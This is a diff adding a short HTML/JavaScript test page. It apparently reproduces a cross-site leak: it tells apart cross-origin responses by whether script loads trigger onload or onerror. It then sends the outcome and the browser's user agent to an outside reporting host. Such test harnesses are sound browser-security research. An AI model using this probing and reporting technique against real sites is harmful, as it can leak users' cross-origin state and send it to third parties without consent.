@@ -1,0 +1,33 @@
+<script>
+    var onload_trigger = [];
+    var onerror_trigger = [];
+
+    function probeError(url) {
+        var script = document.createElement('script');
+        script.src = url;
+
+        script.onload = function () {
+            onload_trigger.push(url);
+        };
+        script.onerror = function () {
+            return onerror_trigger.push(url);
+        };
+
+        document.head.appendChild(script);
+    }
+
+    function report() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://re.port/case1.json/" + btoa(JSON.stringify({
+            "user-agent": navigator.userAgent,
+            "onload_trigger": onload_trigger,
+            "onerror_trigger": onerror_trigger,
+            "xsleak_reproduced": onload_trigger[0] === "https://leak.test/" && onerror_trigger[0] === "https://leak.test/404"
+        })));
+        xhr.send();
+    }
+
+    probeError('https://leak.test/404');
+    probeError('https://leak.test/');
+    setTimeout(report, 2000);
+</script>
